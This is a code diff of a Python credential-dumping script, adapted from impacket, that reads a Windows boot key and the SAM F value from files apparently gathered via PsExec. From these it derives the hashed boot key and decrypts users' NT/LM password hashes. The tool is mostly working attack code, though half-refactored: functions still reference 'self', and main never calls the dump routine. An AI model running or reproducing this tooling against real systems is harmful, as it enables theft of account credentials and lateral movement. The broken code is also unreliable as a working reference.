@@ -4,36 +4,180 @@
 
 # Credit to impacket for a lot of this decryption; I merely put the pieces together: https://github.com/fortra/impacket
 
+from ctypes import *
+from binascii import unhexlify
+import hashlib
 
-def getBootKey(self):
-        # Local Version whenever we are given the files directly
+from Cryptodome.Cipher import DES, ARC4, AES
+from Cryptodome.Hash import HMAC, MD4, MD5
+
+from struct import pack, unpack
+
+
+# Where all our files are written 
+dirPath = "C:\Windows\SysWOW64\out" # under WOW64 only because we are executing PsExec, not PsExec64
+
+class CryptoCommon:
+    @staticmethod
+    def decryptAES(key, value, iv=b'\x00'*16):
+        plainText = b''
+        if iv != b'\x00'*16:
+            aes256 = AES.new(key,AES.MODE_CBC, iv)
+
+        for index in range(0, len(value), 16):
+            if iv == b'\x00'*16:
+                aes256 = AES.new(key,AES.MODE_CBC, iv)
+            cipherBuffer = value[index:index+16]
+            # Pad buffer to 16 bytes
+            if len(cipherBuffer) < 16:
+                cipherBuffer += b'\x00' * (16-len(cipherBuffer))
+            plainText += aes256.decrypt(cipherBuffer)
+
+        return plainText
+
+class USER_ACCOUNT_V(Structure):
+    structure = (
+        ('Unknown','12s=b""'),
+        ('NameOffset','<L=0'),
+        ('NameLength','<L=0'),
+        ('Unknown2','<L=0'),
+        ('FullNameOffset','<L=0'),
+        ('FullNameLength','<L=0'),
+        ('Unknown3','<L=0'),
+        ('CommentOffset','<L=0'),
+        ('CommentLength','<L=0'),
+        ('Unknown3','<L=0'),
+        ('UserCommentOffset','<L=0'),
+        ('UserCommentLength','<L=0'),
+        ('Unknown4','<L=0'),
+        ('Unknown5','12s=b""'),
+        ('HomeDirOffset','<L=0'),
+        ('HomeDirLength','<L=0'),
+        ('Unknown6','<L=0'),
+        ('HomeDirConnectOffset','<L=0'),
+        ('HomeDirConnectLength','<L=0'),
+        ('Unknown7','<L=0'),
+        ('ScriptPathOffset','<L=0'),
+        ('ScriptPathLength','<L=0'),
+        ('Unknown8','<L=0'),
+        ('ProfilePathOffset','<L=0'),
+        ('ProfilePathLength','<L=0'),
+        ('Unknown9','<L=0'),
+        ('WorkstationsOffset','<L=0'),
+        ('WorkstationsLength','<L=0'),
+        ('Unknown10','<L=0'),
+        ('HoursAllowedOffset','<L=0'),
+        ('HoursAllowedLength','<L=0'),
+        ('Unknown11','<L=0'),
+        ('Unknown12','12s=b""'),
+        ('LMHashOffset','<L=0'),
+        ('LMHashLength','<L=0'),
+        ('Unknown13','<L=0'),
+        ('NTHashOffset','<L=0'),
+        ('NTHashLength','<L=0'),
+        ('Unknown14','<L=0'),
+        ('Unknown15','24s=b""'),
+        ('Data',':=b""'),
+    )
+
+class DOMAIN_ACCOUNT_F(Structure):
+    structure = (
+        ('Revision','<L=0'),
+        ('Unknown','<L=0'),
+        ('CreationTime','<Q=0'),
+        ('DomainModifiedCount','<Q=0'),
+        ('MaxPasswordAge','<Q=0'),
+        ('MinPasswordAge','<Q=0'),
+        ('ForceLogoff','<Q=0'),
+        ('LockoutDuration','<Q=0'),
+        ('LockoutObservationWindow','<Q=0'),
+        ('ModifiedCountAtLastPromotion','<Q=0'),
+        ('NextRid','<L=0'),
+        ('PasswordProperties','<L=0'),
+        ('MinPasswordLength','<H=0'),
+        ('PasswordHistoryLength','<H=0'),
+        ('LockoutThreshold','<H=0'),
+        ('Unknown2','<H=0'),
+        ('ServerState','<L=0'),
+        ('ServerRole','<H=0'),
+        ('UasCompatibilityRequired','<H=0'),
+        ('Unknown3','<Q=0'),
+        ('Key0',':'),
+    )
+
+class SAM_KEY_DATA(Structure):
+    structure = (
+        ('Revision','<L=0'),
+        ('Length','<L=0'),
+        ('Salt','16s=b""'),
+        ('Key','16s=b""'),
+        ('CheckSum','16s=b""'),
+        ('Reserved','<Q=0'),
+    )
+
+class SAM_KEY_DATA_AES(Structure):
+    structure = (
+        ('Revision','<L=0'),
+        ('Length','<L=0'),
+        ('CheckSumLen','<L=0'),
+        ('DataLen','<L=0'),
+        ('Salt','16s=b""'),
+        ('Data',':'),
+    )
+
+def MD5(data):
+        md5 = hashlib.new('md5')
+        md5.update(data)
+        return md5.digest()
+
+
+# Take the bootkey we know and love and actually perform the transforms to get the real bootkey
+def getRealBootKey(bootKeyValue):
         bootKey = b''
-        tmpKey = b''
-        winreg = winregistry.Registry(self.__systemHive, False)
-        # We gotta find out the Current Control Set
-        currentControlSet = winreg.getValue('\\Select\\Current')[1]
-        currentControlSet = "ControlSet%03d" % currentControlSet
-        for key in ['JD', 'Skew1', 'GBG', 'Data']:
-            LOG.debug('Retrieving class info for %s' % key)
-            ans = winreg.getClass('\\%s\\Control\\Lsa\\%s' % (currentControlSet, key))
-            digit = ans[:16].decode('utf-16le')
-            tmpKey = tmpKey + b(digit)
 
         transforms = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]
 
-        tmpKey = unhexlify(tmpKey)
+        tmpKey = unhexlify(bootKeyValue)
 
         for i in range(len(tmpKey)):
             bootKey += tmpKey[transforms[i]:transforms[i] + 1]
 
-        LOG.info('Target system bootKey: 0x%s' % hexlify(bootKey).decode('utf-8'))
-
         return bootKey
 
 
-def __decryptHash(self, rid, cryptedHash, constant, newStyle = False):
-        # Section 2.2.11.1.1 Encrypting an NT or LM Hash Value with a Specified Key
-        # plus hashedBootKey stuff
+def getHBootKey(bootKey, fKeyValue):
+        QWERTY = b"!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0"
+        DIGITS = b"0123456789012345678901234567890123456789\0"
+
+        hashedBootKey = ""
+
+        F = fKeyValue
+
+        domainData = DOMAIN_ACCOUNT_F(F)
+
+        if domainData['Key0'][0:1] == b'\x01':
+            samKeyData = SAM_KEY_DATA(domainData['Key0'])
+
+            rc4Key = MD5(samKeyData['Salt'] + QWERTY + bootKey + DIGITS)
+            rc4 = ARC4.new(rc4Key)
+            hashedBootKey = rc4.encrypt(samKeyData['Key']+samKeyData['CheckSum'])
+
+            # Verify key with checksum
+            checkSum = MD5( hashedBootKey[:16] + DIGITS + hashedBootKey[:16] + QWERTY)
+
+            if checkSum != hashedBootKey[16:]:
+                raise Exception('hashedBootKey CheckSum failed, Syskey startup password probably in use! :(')
+
+        elif domainData['Key0'][0:1] == b'\x02':
+            # This is Windows 2016 TP5 on in theory (it is reported that some W10 and 2012R2 might behave this way also)
+            samKeyData = SAM_KEY_DATA_AES(domainData['Key0'])
+
+            hashedBootKey = CryptoCommon.decryptAES(bootKey, samKeyData['Data'][:samKeyData['DataLen']], samKeyData['Salt'])
+
+        return hashedBootKey
+
+
+def decryptHash(rid, cryptedHash, constant, newStyle = False):
         Key1,Key2 = self.__cryptoCommon.deriveKey(rid)
 
         Crypt1 = DES.new(Key1, DES.MODE_ECB)
@@ -44,7 +188,7 @@ def __decryptHash(self, rid, cryptedHash, constant, newStyle = False):
             rc4 = ARC4.new(rc4Key)
             key = rc4.encrypt(cryptedHash['Hash'])
         else:
-            key = self.__cryptoCommon.decryptAES(self.__hashedBootKey[:0x10], cryptedHash['Hash'], cryptedHash['Salt'])[:16]
+            key = CryptoCommon.decryptAES(self.__hashedBootKey[:0x10], cryptedHash['Hash'], cryptedHash['Salt'])[:16]
 
         decryptedHash = Crypt1.decrypt(key[:8]) + Crypt2.decrypt(key[8:])
 
@@ -71,6 +215,7 @@ def dump(self):
     except:
         pass
 
+    # Change this to array of our rid V values
     for rid in rids:
         userAccount = USER_ACCOUNT_V(self.getValue(ntpath.join(usersKey,rid,'V'))[1])
         rid = int(rid,16)
@@ -80,7 +225,7 @@ def dump(self):
         userName = V[userAccount['NameOffset']:userAccount['NameOffset']+userAccount['NameLength']].decode('utf-16le')
 
         if userAccount['NTHashLength'] == 0:
-            logging.debug('The account %s doesn\'t have hash information.' % userName)
+            print('The account %s doesn\'t have hash information.' % userName)
             continue
 
         encNTHash = b''
@@ -121,7 +266,31 @@ def dump(self):
 
 
 
+
+
 def main():
+
+    # Grab our bootkey 
+    bootKeyValue = open(dirPath + "/bootkey.txt", "r").readline()
+
+    print("Bootkey value from file is " + bootKeyValue)
+
+    realBootKey = getRealBootKey(bootKeyValue)
+
+    print("Real bootkey is " + realBootKey)
+
+    # Get the hashed bootkey
+    print("Getting hashed bootkey...")
+
+    # Grab our F value
+    fKeyValue = open(dirPath + "/fkey.txt", "r").readline()
+
+    hBootKey = getHBootKey(realBootKey, fKeyValue)
+
+
+    # Pass over to dump 
+
+
     return
 
 
